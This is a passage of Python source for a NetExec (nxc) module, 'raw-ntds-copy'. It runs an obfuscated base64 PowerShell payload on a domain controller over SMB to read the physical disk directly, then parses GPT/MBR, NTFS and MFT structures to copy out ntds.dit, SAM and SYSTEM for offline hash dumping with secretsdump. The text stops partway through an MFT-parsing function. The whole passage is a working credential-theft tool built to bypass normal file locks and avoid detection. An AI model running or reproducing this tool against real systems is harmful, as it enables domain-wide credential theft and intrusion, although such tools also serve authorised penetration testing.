# raw-ntds-copy module for nxc
# Author of the module : Github:@0xb11a1, X:@0xcc00

import base64
from os import makedirs
from os.path import join, abspath
import binascii
from nxc.paths import TMP_PATH
import struct
from dataclasses import dataclass, field
import random
import gzip
from io import BytesIO


class NXCModule:
    name = "raw-ntds-copy"
    description = "Extracting the ntds.dit, SAM, and SYSTEM files from DC by accessing the raw hard drive."
    supported_protocols = ["smb"]
    opsec_safe = True  # could be flagged
    multiple_hosts = False
    files_full_location_to_extract = [
        "Windows/System32/config/SYSTEM",
        "Windows/System32/config/SAM",
        "Windows/NTDS/ntds.dit",
    ]
    files_to_extract = [
        c_filename.split("/")[-1] for c_filename in files_full_location_to_extract
    ]
    number_of_file_to_extract = len(files_to_extract)
    extracted_files_location_local = {"SAM": "", "SYSTEM": "", "ntds.dit": ""}
    NTFS_LOCATION = 0
    MFT_LOCATION = 0
    context = None
    connection = None
    GPT_HEADER_OFFSET = 512
    GPT_HEADER_SIZE = 92
    PARTITION_ENTRY_SIZE = 128
    NUM_PARTITION_ENTRIES = 128
    SECTOR_SIZE = 512
    CLUSTER_SIZE = 4096
    CHUNK_SIZE = 1024 * 1024 * 20  # chunk size of the file to retrive at a time
    MFT_local_path = ""
    MFT_local_size = 0
    RANDOM_RUN_NUM = int(random.random() * 100000000)
    ATTRIBUTE_NAMES = {
        0x10: "$STANDARD_INFORMATION",
        0x20: "$ATTRIBUTE_LIST",
        0x30: "$FILE_NAME",
        0x40: "$OBJECT_ID",
        0x50: "$SECURITY_DESCRIPTOR",
        0x60: "$VOLUME_NAME",
        0x70: "$VOLUME_INFORMATION",
        0x80: "$DATA",
        0x90: "$INDEX_ROOT",
        0xA0: "$INDEX_ALLOCATION",
        0xB0: "$BITMAP",
        0xC0: "$REPARSE_POINT",
        0xD0: "$EA_INFORMATION",
        0xE0: "$EA",
        0x100: "$LOGGED_UTILITY_STREAM",
    }

    @dataclass
    class MFA_sector_properties:
        filename: str = ""
        dataRun: list = field(default_factory=list)
        size: int = 0
        parent_name: str = ""
        parent_record_number: int = 0
        full_path: str = ""

    def options(self, context, module_options):
        pass

    def read_from_disk(self, offset, size):
        if size % 512 != 0:
            fixed_size = size // 512 + 512
        else:
            fixed_size = size
        # scary base64 powershell code :)
        # This to read the PhysicalDrive0 file
        Get_data_script = f"""powershell.exe -c "$base64Cmd = 'IABBAGQAZAAtAFQAeQBwAGUAIAAtAFQAeQBwAGUARABlAGYAaQBuAGkAdABpAG8AbgAgAEAAIgAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwA7AAoAdQBzAGkAbgBnACAATQBpAGMAcgBvAHMAbwBmAHQALgBXAGkAbgAzADIALgBTAGEAZgBlAEgAYQBuAGQAbABlAHMAOwAKAAoAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABDAE4AYQB0AGkAdgBlAE0AZQB0AGgAbwBkAHMACgB7AAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAGMAbwBuAHMAdAAgAHUAaQBuAHQAIABHAEUATgBFAFIASQBDAF8AUgBFAEEARAAgAD0AIAAwAHgAOAAwADAAMAAwADAAMAAwADsACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAYwBvAG4AcwB0ACAAdQBpAG4AdAAgAE8AUABFAE4AXwBFAFgASQBTAFQASQBOAEcAIAA9ACAAMwA7AAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAGMAbwBuAHMAdAAgAHUAaQBuAHQAIABGAEkATABFAF8AUwBIAEEAUgBFAF8AUgBFAEEARAAgAD0AIAAwAHgAMAAwADAAMAAwADAAMAAxADsACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAYwBvAG4AcwB0ACAAdQBpAG4AdAAgAEYASQBMAEUAXwBTAEgAQQBSAEUAXwBXAFIASQBUAEUAIAA9ACAAMAB4ADAAMAAwADAAMAAwADAAMgA7AAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAGMAbwBuAHMAdAAgAHUAaQBuAHQAIABGAEkATABFAF8AUwBIAEEAUgBFAF8ARABFAEwARQBUAEUAIAA9ACAAMAB4ADAAMAAwADAAMAAwADAANAA7AAoACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbABsACIALAAgAFMAZQB0AEwAYQBzAHQARQByAHIAbwByACAAPQAgAHQAcgB1AGUALAAgAEMAaABhAHIAUwBlAHQAIAA9ACAAQwBoAGEAcgBTAGUAdAAuAFUAbgBpAGMAbwBkAGUAKQBdAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABTAGEAZgBlAEYAaQBsAGUASABhAG4AZABsAGUAIABDAHIAZQBhAHQAZQBGAGkAbABlACgACgAgACAAIAAgACAAIAAgACAAcwB0AHIAaQBuAGcAIABsAHAARgBpAGwAZQBOAGEAbQBlACwAIAAKACAAIAAgACAAIAAgACAAIAB1AGkAbgB0ACAAZAB3AEQAZQBzAGkAcgBlAGQAQQBjAGMAZQBzAHMALAAgAAoAIAAgACAAIAAgACAAIAAgAHUAaQBuAHQAIABkAHcAUwBoAGEAcgBlAE0AbwBkAGUALAAgAAoAIAAgACAAIAAgACAAIAAgAEkAbgB0AFAAdAByACAAbABwAFMAZQBjAHUAcgBpAHQAeQBBAHQAdAByAGkAYgB1AHQAZQBzACwAIAAKACAAIAAgACAAIAAgACAAIAB1AGkAbgB0ACAAZAB3AEMAcgBlAGEAdABpAG8AbgBEAGkAcwBwAG8AcwBpAHQAaQBvAG4ALAAgAAoAIAAgACAAIAAgACAAIAAgAHUAaQBuAHQAIABkAHcARgBsAGEAZwBzAEEAbgBkAEEAdAB0AHIAaQBiAHUAdABlAHMALAAgAAoAIAAgACAAIAAgACAAIAAgAEkAbgB0AFAAdAByACAAaABUAGUAbQBwAGwAYQB0AGUARgBpAGwAZQAKACAAIAAgACAAKQA7AAoACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbABsACIALAAgAFMAZQB0AEwAYQBzAHQARQByAHIAbwByACAAPQAgAHQAcgB1AGUAKQBdAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAAUgBlAGEAZABGAGkAbABlACgACgAgACAAIAAgACAAIAAgACAAUwBhAGYAZQBGAGkAbABlAEgAYQBuAGQAbABlACAAaABGAGkAbABlACwAIAAKACAAIAAgACAAIAAgACAAIABiAHkAdABlAFsAXQAgAGwAcABCAHUAZgBmAGUAcgAsACAACgAgACAAIAAgACAAIAAgACAAdQBpAG4AdAAgAG4ATgB1AG0AYgBlAHIATwBmAEIAeQB0AGUAcwBUAG8AUgBlAGEAZAAsACAACgAgACAAIAAgACAAIAAgACAAbwB1AHQAIAB1AGkAbgB0ACAAbABwAE4AdQBtAGIAZQByAE8AZgBCAHkAdABlAHMAUgBlAGEAZAAsACAACgAgACAAIAAgACAAIAAgACAASQBuAHQAUAB0AHIAIABsAHAATwB2AGUAcgBsAGEAcABwAGUAZAAKACAAIAAgACAAKQA7AAoACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbABsACIALAAgAFMAZQB0AEwAYQBzAHQARQByAHIAbwByACAAPQAgAHQAcgB1AGUAKQBdAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAAUwBlAHQARgBpAGwAZQBQAG8AaQBuAHQAZQByAEUAeAAoAAoAIAAgACAAIAAgACAAIAAgAFMAYQBmAGUARgBpAGwAZQBIAGEAbgBkAGwAZQAgAGgARgBpAGwAZQAsACAACgAgACAAIAAgACAAIAAgACAAbABvAG4AZwAgAGwARABpAHMAdABhAG4AYwBlAFQAbwBNAG8AdgBlACwAIAAKACAAIAAgACAAIAAgACAAIABvAHUAdAAgAGwAbwBuAGcAIABsAHAATgBlAHcARgBpAGwAZQBQAG8AaQBuAHQAZQByACwAIAAKACAAIAAgACAAIAAgACAAIAB1AGkAbgB0ACAAZAB3AE0AbwB2AGUATQBlAHQAaABvAGQACgAgACAAIAAgACkAOwAKAH0ACgAKAHAAdQBiAGwAaQBjACAAZQBuAHUAbQAgAEUATQBvAHYAZQBNAGUAdABoAG8AZAAgADoAIAB1AGkAbgB0AAoAewAKACAAIAAgACAAQgBlAGcAaQBuACAAPQAgADAALAAKACAAIAAgACAAQwB1AHIAcgBlAG4AdAAgAD0AIAAxACwACgAgACAAIAAgAEUAbgBkACAAPQAgADIACgB9AAoAIgBAAAoARgB1AG4AYwB0AGkAbwBuACAAcgBlAGEAZABfAGQAaQBzAGsAewAKAAoACgAkAG8AZgBmAHMAZQB0ACAAPQAgAFsAbABvAG4AZwBdACQAYQByAGcAcwBbADAAXQAKACQAcwBpAHoAZQAgAD0AIABbAGkAbgB0AF0AJABhAHIAZwBzAFsAMQBdAAoAdAByAHkAIAB7AAoAIAAgACAAIAAkAGgAYQBuAGQAbABlACAAPQAgAFsAQwBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAF0AOgA6AEMAcgBlAGEAdABlAEYAaQBsAGUAKAAiAFwAXAAuAFwAUABIAFkAUwBJAEMAQQBMAEQAUgBJAFYARQAwACIALAAgAAoAIAAgACAAIAAgACAAIAAgAFsAQwBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAF0AOgA6AEcARQBOAEUAUgBJAEMAXwBSAEUAQQBEACwAIAAKACAAIAAgACAAIAAgACAAIABbAEMATgBhAHQAaQB2AGUATQBlAHQAaABvAGQAcwBdADoAOgBGAEkATABFAF8AUwBIAEEAUgBFAF8AUgBFAEEARAAgAC0AYgBvAHIAIABbAEMATgBhAHQAaQB2AGUATQBlAHQAaABvAGQAcwBdADoAOgBGAEkATABFAF8AUwBIAEEAUgBFAF8AVwBSAEkAVABFACAALQBiAG8AcgAgAFsAQwBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAF0AOgA6AEYASQBMAEUAXwBTAEgAQQBSAEUAXwBEAEUATABFAFQARQAsACAACgAgACAAIAAgACAAIAAgACAAWwBJAG4AdABQAHQAcgBdADoAOgBaAGUAcgBvACwAIABbAEMATgBhAHQAaQB2AGUATQBlAHQAaABvAGQAcwBdADoAOgBPAFAARQBOAF8ARQBYAEkAUwBUAEkATgBHACwAIAAwACwAIABbAEkAbgB0AFAAdAByAF0AOgA6AFoAZQByAG8AKQAKAAoAIAAgACAAIABpAGYAIAAoACQAaABhAG4AZABsAGUALgBJAHMASQBuAHYAYQBsAGkAZAApACAAewAKACAAIAAgACAAIAAgACAAIAB0AGgAcgBvAHcAIAAiAEYAYQBpAGwAZQBkACAAdABvACAAYwByAGUAYQB0AGUAIABmAGkAbABlACAAaABhAG4AZABsAGUAIgAKACAAIAAgACAAfQAKAAoAIAAgACAAIAAkAG0AbwB2AGUAVABvAEgAaQBnAGgAIAA9ACAAMAAKACAAIAAgACAAJABzAHUAYwBjAGUAcwBzACAAPQAgAFsAQwBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAF0AOgA6AFMAZQB0AEYAaQBsAGUAUABvAGkAbgB0AGUAcgBFAHgAKAAkAGgAYQBuAGQAbABlACwAIAAkAG8AZgBmAHMAZQB0ACwAIABbAHIAZQBmAF0AJABtAG8AdgBlAFQAbwBIAGkAZwBoACwAIABbAEUATQBvAHYAZQBNAGUAdABoAG8AZABdADoAOgBCAGUAZwBpAG4AKQAKACAAIAAgACAAaQBmACAAKAAtAG4AbwB0ACAAJABzAHUAYwBjAGUAcwBzACkAIAB7AAoAIAAgACAAIAAgACAAIAAgAHQAaAByAG8AdwAgACIARgBhAGkAbABlAGQAIAB0AG8AIABzAGUAdAAgAGYAaQBsAGUAIABwAG8AaQBuAHQAZQByACIACgAgACAAIAAgAH0ACgAKACAAIAAgACAAJABiAHUAZgBmAGUAcgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAYgB5AHQAZQBbAF0AIAAkAHMAaQB6AGUACgAgACAAIAAgACQAYgB5AHQAZQBzAFIAZQBhAGQAIAA9ACAAMAAKACAAIAAgACAAJABzAHUAYwBjAGUAcwBzACAAPQAgAFsAQwBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAF0AOgA6AFIAZQBhAGQARgBpAGwAZQAoACQAaABhAG4AZABsAGUALAAgACQAYgB1AGYAZgBlAHIALAAgACQAcwBpAHoAZQAsACAAWwByAGUAZgBdACQAYgB5AHQAZQBzAFIAZQBhAGQALAAgAFsASQBuAHQAUAB0AHIAXQA6ADoAWgBlAHIAbwApAAoACgAgACAAIAAgAGkAZgAgACgALQBuAG8AdAAgACQAcwB1AGMAYwBlAHMAcwApACAAewAKACAAIAAgACAAIAAgACAAIAB0AGgAcgBvAHcAIAAiAEYAYQBpAGwAZQBkACAAdABvACAAcgBlAGEAZAAgAGYAaQBsAGUAIgAKACAAIAAgACAAfQAKAAoAIAAgACAAIAAkAG0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtAAoACgAgACAAIAAgAAoAIAAgACAAIAAkAGcAegBpAHAAUwB0AHIAZQBhAG0AIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACQAbQBlAG0AbwByAHkAUwB0AHIAZQBhAG0ALAAgAFsAUwB5AHMAdABlAG0ALgBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBDAG8AbQBwAHIAZQBzAHMAKQAKAAoAIAAgACAAIAAkAGcAegBpAHAAUwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAGIAdQBmAGYAZQByACwAIAAwACwAIAAkAGIAdQBmAGYAZQByAC4ATABlAG4AZwB0AGgAKQAKACAAIAAgACAAJABnAHoAaQBwAFMAdAByAGUAYQBtAC4AQwBsAG8AcwBlACgAKQAKACAAIAAgACAACgAgACAAIAAgACQAYwBvAG0AcAByAGUAcwBzAGUAZABCAHkAdABlAHMAIAA9ACAAJABtAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQAuAFQAbwBBAHIAcgBhAHkAKAApAAoAIAAgACAAIAAKACAAIAAgACAAJABjAG8AbQBwAHIAZQBzAHMAZQBkAEIAYQBzAGUANgA0ACAAPQAgAFsAQwBvAG4AdgBlAHIAdABdADoAOgBUAG8AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAkAGMAbwBtAHAAcgBlAHMAcwBlAGQAQgB5AHQAZQBzACkACgAKACAAIAAgACAAVwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAkAGMAbwBtAHAAcgBlAHMAcwBlAGQAQgBhAHMAZQA2ADQACgAKACAAIAAgACAACgAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIABXAHIAaQB0AGUALQBFAHIAcgBvAHIAIAAiAEEAbgAgAGUAcgByAG8AcgAgAG8AYwBjAHUAcgByAGUAZAA6ACAAJABfACIACgB9AAoACgBmAGkAbgBhAGwAbAB5ACAAewAKACAAIAAgACAAaQBmACAAKAAkAGgAYQBuAGQAbABlACAALQBhAG4AZAAgACEAJABoAGEAbgBkAGwAZQAuAEkAcwBJAG4AdgBhAGwAaQBkACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACQAaABhAG4AZABsAGUALgBDAGwAbwBzAGUAKAApAAoAIAAgACAAIAB9AAoAfQAKAH0ACgA=';$decodedCmd = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($base64Cmd)) + '; read_disk {offset} {fixed_size}'; Invoke-Expression $decodedCmd" """
        data_output = self.connection.execute(Get_data_script, True)
        self.context.log.debug(f"{offset=},{size=},{fixed_size=},{data_output=}")
        compressed_bytes = base64.b64decode(data_output)[:size]
        compressed_stream = BytesIO(compressed_bytes)

        with gzip.GzipFile(fileobj=compressed_stream, mode="rb") as gzip_file:
            decompressed_bytes = gzip_file.read()

        return decompressed_bytes[:size]

    def on_admin_login(self, context, connection):
        self.connection = connection
        self.context = context
        self.main()

    def main(self):
        first_section = self.read_from_disk(0, 1024)
        if len(first_section) == 0:
            self.context.log.fail(
                "Unable to read the Disk, try changing the --exec-method flag"
            )
        if first_section[512 : 512 + 8] == b"EFI PART":
            self.context.log.display("Disk is formated using GPT")
            NTFS_LOCATION = self.analyze_gpt("\\\\.\\PhysicalDrive0")
            if NTFS_LOCATION == -1:
                self.context.log.fail("[-] NTFS Basic data partition not found ")
        else:
            self.context.log.display("Disk is formated using MBR")
            max_parition_size = 0
            NTFS_LOCATION = (
                self.bytes_to_int_unsigned(first_section[0x1C6:0x1CA])
                * self.SECTOR_SIZE
            )
            for partition_indx in range(4):
                curr_partition_size = self.bytes_to_int_unsigned(
                    first_section[
                        0x1CA
                        + (partition_indx * 0x10) : 0x1CE
                        + (partition_indx * 0x10)
                    ]
                )
                # self.context.log.highlight(curr_partition_size)
                if curr_partition_size > max_parition_size:
                    max_parition_size = curr_partition_size
                    NTFS_LOCATION = (
                        self.bytes_to_int_unsigned(
                            first_section[
                                0x1C6
                                + (partition_indx * 0x10) : 0x1CA
                                + (partition_indx * 0x10)
                            ]
                        )
                        * self.SECTOR_SIZE
                    )

        self.context.log.display(f"NTFS Location {hex(NTFS_LOCATION)}")
        self.NTFS_LOCATION = NTFS_LOCATION
        NTFS_header = self.read_from_disk(NTFS_LOCATION, 1024)

        self.analyze_NTFS(NTFS_header)
        self.context.log.display(
            f"MFT location {hex(self.MFT_LOCATION)}, Cluster_size {self.CLUSTER_SIZE}"
        )

        MFT_file_header_data = self.read_from_disk(self.MFT_LOCATION, 1024)
        MFT_file_header = self.analyze_MFT_header(MFT_file_header_data)

        self.context.log.highlight(
            "[+] This may take a while, perfect time to grab a coffee! c[_] "
        )

        self.read_MFT(MFT_file_header)

        if self.number_of_file_to_extract != 0:
            self.context.log.fail("Unable to find all needed files")
        self.context.log.display("Done, Have fun with the hashes")
        self.context.log.display(
            f"Next : secretsdump.py LOCAL -sam {self.extracted_files_location_local['SAM']} -system {self.extracted_files_location_local['SYSTEM']} -ntds {self.extracted_files_location_local['ntds.dit']}"
        )

    def analyze_NTFS(self, ntfs_header):
        ntfs_header = ntfs_header[0xB : 0xB + 25 + 48]
        header_format = "<HBH3BHBHHHIIIQQQIB3BQI"

        data = struct.unpack(header_format, ntfs_header)

        Bytes_per_sector = data[0]
        Sectors_per_cluster = data[1]
        MFT_cluster_number = data[15]

        self.CLUSTER_SIZE = Bytes_per_sector * Sectors_per_cluster
        self.MFT_LOCATION = MFT_cluster_number * self.CLUSTER_SIZE + self.NTFS_LOCATION

    def read_MFT(self, MFT_file_header: MFA_sector_properties):
        # resize dataRun into a small chunks
        host = self.connection.host
        filename_on_disk = f"{host}_MFT_{self.RANDOM_RUN_NUM}.bin"
        export_path = join(TMP_PATH, "raw_ntds_dump")
        path = abspath(join(export_path, filename_on_disk))
        makedirs(export_path, exist_ok=True)
        self.MFT_local_path = path
        self.context.log.display(
            f"Analyzing & Extracting {MFT_file_header.filename} {MFT_file_header.size/(1024**2)}MB"
        )
        for i in MFT_file_header.dataRun:
            cluster_loc = i[0] * self.CLUSTER_SIZE
            size = i[1] * self.CLUSTER_SIZE
            curr_cluster_loc = cluster_loc + self.NTFS_LOCATION
            chunk_size = self.CHUNK_SIZE
            while size > 0:
                if size < chunk_size:
                    chunk_size = size
                self.context.log.debug(f"{hex(curr_cluster_loc)=}")
                curr_data = self.read_from_disk(curr_cluster_loc, chunk_size)
                curr_cluster_loc += chunk_size
                size -= chunk_size
                self.context.log.debug(f"{len(curr_data)=} ")
                self.context.log.debug(f"{size=}")

                with open(path, "ab") as f:
                    f.write(curr_data)

                self.MFT_local_size += chunk_size
                self.search_for_the_files(curr_data)

                if self.number_of_file_to_extract == 0:
                    return

    def search_for_the_files(self, curr_data):

        MFT_record_indx = 0
        # self.context.log.display("Reading next MFT chunk")
        for curr_record_indx in range(len(curr_data) // 1024):
            curr_sector = curr_data[
                curr_record_indx * 1024 : curr_record_indx * 1024 + 1024
            ]
            try:
                curr_MFA_sector_properties = self.analyze_MFT_header(curr_sector)
                if (
                    curr_MFA_sector_properties == None
                    or curr_MFA_sector_properties.filename == None
                ):
                    continue
            except Exception as e:
                self.context.log.debug(e)
                continue

            if curr_MFA_sector_properties.filename in self.files_to_extract:
                # self.context.log.display(curr_MFA_sector_properties.filename)
                wanted_file_indx = self.files_to_extract.index(
                    curr_MFA_sector_properties.filename
                )
                wanted_file_location = "/".join(
                    self.files_full_location_to_extract[wanted_file_indx].split("/")[
                        :-1
                    ]
                )

                if curr_MFA_sector_properties.size == 0:
                    continue
                curr_full_path = self.get_full_path(
                    curr_MFA_sector_properties.parent_record_number
                )
                # self.context.log.display(curr_full_path)
                # self.context.log.display(wanted_file_location)

                if (
                    wanted_file_location.lower()
                    == "/".join(curr_full_path[::-1]).lower()
                ):
                    self.context.log.success(
                        f"Found {self.files_full_location_to_extract[wanted_file_indx]} {curr_MFA_sector_properties.size/(1024**2)}MB .. extracting "
                    )
                    curr_file_local_location = self.extractDataRunBytes(
                        curr_MFA_sector_properties.dataRun,
                        filename=f"{MFT_record_indx}_{curr_MFA_sector_properties.filename}",
                        offset=self.NTFS_LOCATION,
                    )
                    self.extracted_files_location_local[
                        curr_MFA_sector_properties.filename
                    ] = curr_file_local_location
                    self.number_of_file_to_extract -= 1
            MFT_record_indx += 1

    def get_MFT_record_at(self, record_number):
        if record_number * 1024 < self.MFT_local_size:
            with open(self.MFT_local_path, "rb") as f:
                f.seek(record_number * 1024, 0)
                curr_record_data = f.read(1024)
        else:
            curr_record_data = self.read_from_disk(
                self.MFT_LOCATION + (record_number * 1024), 1024
            )
        return curr_record_data

    def get_full_path(self, curr_parent_indx):
        full_path = []
        max_depth = 20  # to prevent Infinite if that ever happened
        # for now to check if is reached
        while curr_parent_indx > 10:
            curr_record_data = self.get_MFT_record_at(curr_parent_indx)
            curr_MFT_properites = self.analyze_MFT_header(curr_record_data)
            if (
                curr_MFT_properites == None
                or curr_MFT_properites.filename == None
                or max_depth == 0
            ):
                break
            full_path.append(curr_MFT_properites.filename)
            curr_parent_indx = curr_MFT_properites.parent_record_number
            max_depth -= 1
        return full_path

    def extractDataRunBytes(
        self,
        lst,
        filename,
        offset=0,
    ):
        host = self.connection.host
        filename_on_disk = f"{host}_{filename}_{self.RANDOM_RUN_NUM}.bin"
        export_path = join(TMP_PATH, "raw_ntds_dump")
        path = abspath(join(export_path, filename_on_disk))
        makedirs(export_path, exist_ok=True)
        self.context.log.display(f"Extracting {filename} to {path}")
        for i in lst:
            cluster_loc = i[0] * self.CLUSTER_SIZE
            size = i[1] * self.CLUSTER_SIZE
            curr_cluster_loc = cluster_loc + offset
            chunk_size = self.CHUNK_SIZE
            while size > 0:
                self.context.log.debug("REading data ... ")
                if size < chunk_size:
                    chunk_size = size
                self.context.log.debug(f"{hex(curr_cluster_loc)=}")
                curr_data = self.read_from_disk(curr_cluster_loc, chunk_size)
                curr_cluster_loc += chunk_size
                size -= chunk_size
                self.context.log.debug(f"{len(curr_data)=} ")
                self.context.log.debug(f"{size=}")

                with open(path, "ab") as f:
                    f.write(curr_data)
        return path

    def get_datarun_chunks(self, lst):
        for i in lst:
            cluster_loc = i[0] * self.CLUSTER_SIZE
            size = i[1] * self.CLUSTER_SIZE

            curr_cluster_loc = cluster_loc + self.NTFS_LOCATION
            chunk_size = self.CHUNK_SIZE
            while size > 0:
                self.context.log.debug("REading data ... ")
                if size < chunk_size:
                    chunk_size = size
                self.context.log.debug(f"{hex(curr_cluster_loc)=}")
                curr_data = self.read_from_disk(curr_cluster_loc, chunk_size)
                curr_cluster_loc += chunk_size
                size -= chunk_size
                self.context.log.debug(f"{len(curr_data)=} ")
                self.context.log.debug(f"{size=}")

    def hexbytes(self, xs, group_size=1, byte_separator=" ", group_separator=" "):
        def ordc(c):
            return ord(c) if isinstance(c, str) else c

        if len(xs) <= group_size:
            s = byte_separator.join("%02X" % (ordc(x)) for x in xs)
        else:
            r = len(xs) % group_size
            s = group_separator.join(
                [
                    byte_separator.join("%02X" % (ordc(x)) for x in group)
                    for group in zip(*[iter(xs)] * group_size)
                ]
            )
            if r > 0:
                s += group_separator + byte_separator.join(
                    ["%02X" % (ordc(x)) for x in xs[-r:]]
                )
        return s.lower()

    def hexprint(self, xs):
        def chrc(c):
            return c if isinstance(c, str) else chr(c)

        def ordc(c):
            return ord(c) if isinstance(c, str) else c

        def isprint(c):
            return ordc(c) in range(32, 127) if isinstance(c, str) else c > 31

        return "".join([chrc(x) if isprint(x) else "." for x in xs])

    def hexdump(
        self,
        xs,
        group_size=4,
        byte_separator=" ",
        group_separator="-",
        printable_separator="  ",
        address=0,
        address_format="%04X",
        line_size=16,
    ):
        # from pyMFTGrabber.py
        if address is None:
            s = self.hexbytes(xs, group_size, byte_separator, group_separator)
            if printable_separator:
                s += printable_separator + self.hexprint(xs)
        else:
            r = len(xs) % line_size
            s = ""
            bytes_len = 0
            for offset in range(0, len(xs) - r, line_size):
                chunk = xs[offset : offset + line_size]
                bytes = self.hexbytes(
                    chunk, group_size, byte_separator, group_separator
                )
                s += (address_format + ": %s%s\n") % (
                    address + offset,
                    bytes,
                    (
                        printable_separator + self.hexprint(chunk)
                        if printable_separator
                        else ""
                    ),
                )
                bytes_len = len(bytes)

            if r > 0:
                offset = len(xs) - r
                chunk = xs[offset : offset + r]
                bytes = self.hexbytes(
                    chunk, group_size, byte_separator, group_separator
                )
                bytes = bytes + " " * (bytes_len - len(bytes))
                s += (address_format + ": %s%s\n") % (
                    address + offset,
                    bytes,
                    (
                        printable_separator + self.hexprint(chunk)
                        if printable_separator
                        else ""
                    ),
                )

        return s

    def bytes_to_int_signed(self, lst):
        lst_len = len(lst)
        if lst_len == 1:
            return struct.unpack("<b", lst)[0]
        if lst_len == 2:
            return struct.unpack("<h", lst)[0]
        elif lst_len == 4:
            return struct.unpack("<i", lst)[0]
        elif lst_len == 8:
            return struct.unpack("<q", lst)[0]

    def bytes_to_int_unsigned(self, lst):
        lst_len = len(lst)
        if lst_len == 1:
            return struct.unpack("<B", lst)[0]
        if lst_len == 2:
            return struct.unpack("<H", lst)[0]
        elif lst_len == 4:
            return struct.unpack("<I", lst)[0]
        elif lst_len == 8:
            return struct.unpack("<Q", lst)[0]

    def decode_dataRun(self, dataRun):
        self.context.log.debug("datarun:")

        curr_datarun_indx = 0
        prev_datarun_loc = 0
        total_size = 0
        result = list()
        while dataRun[curr_datarun_indx] != 0:
            self.context.log.debug(f"----------------- DataRun {curr_datarun_indx}")
            self.context.log.debug(f"{hex(dataRun[curr_datarun_indx])=}")
            dataRun_startingCluster_nBytes = dataRun[curr_datarun_indx] & 0b00001111
            dataRun_len_nBytes = (dataRun[curr_datarun_indx] & 0b11110000) >> 4
            curr_datarun_indx += 1

            dataRun_len = dataRun[
                curr_datarun_indx : curr_datarun_indx + dataRun_startingCluster_nBytes
            ]
            dataRun_len = int.from_bytes(dataRun_len, byteorder="little", signed=False)
            datarun_startingCluster = dataRun[
                curr_datarun_indx
                + dataRun_startingCluster_nBytes : curr_datarun_indx
                + dataRun_startingCluster_nBytes
                + dataRun_len_nBytes
            ]

            self.context.log.debug(f"{binascii.hexlify(datarun_startingCluster)=} ")
            self.context.log.debug(
                f"{int.from_bytes(datarun_startingCluster, byteorder='little', signed=True)}"
            )
            self.context.log.debug(f"{prev_datarun_loc=}")
            datarun_cluster_loc = (
                int.from_bytes(datarun_startingCluster, byteorder="little", signed=True)
                + prev_datarun_loc
            )
            self.context.log.debug(f"{hex((datarun_cluster_loc*4096))=}")
            self.context.log.debug(f"{hex(dataRun_len)=}")
            total_size += dataRun_len
            result.append([datarun_cluster_loc, dataRun_len])

            curr_datarun_indx = (
                curr_datarun_indx + dataRun_startingCluster_nBytes + dataRun_len_nBytes
            )
            prev_datarun_loc = datarun_cluster_loc

        self.context.log.debug(
            f"total size: {total_size*4096}"
        )  # size is the cluster count, * cluster length
        self.context.log.debug("---- Finished datarun analysis")
        return result, total_size * self.CLUSTER_SIZE

    def parse_MFT_header(self, curr_sector):
        curr_index = 0
        parsed_header = dict()
        self.context.log.debug(self.hexdump(curr_sector))
        while True:
            curr_header = self.bytes_to_int_unsigned(
                curr_sector[curr_index : curr_index + 4]
            )
            if curr_header == 0xFFFFFFFF or curr_header == None:
                break

            curr_header_len = self.bytes_to_int_unsigned(
                curr_sector[curr_index + 4 : curr_index + 4 + 4]
            )

            parsed_header[self.ATTRIBUTE_NAMES[curr_header]] = curr_sector[
                curr_index : curr_index + curr_header_len
            ]

            curr_index = curr_index + curr_header_len
        return parsed_header

    def analyze_MFT_header(self, curr_sector):
        curr_MFA_sector = self.MFA_sector_properties()

        self.context.log.debug(curr_sector[:4])

        if curr_sector[:4] != b"FILE":
            self.context.log.debug("Not a valid header")
            return None

        Offset_to_the_first_attribute = self.bytes_to_int_unsigned(curr_sector[20:22])
        self.context.log.debug(f"{hex(Offset_to_the_first_attribute)=}")

        parsed_header = self.parse_MFT_header(
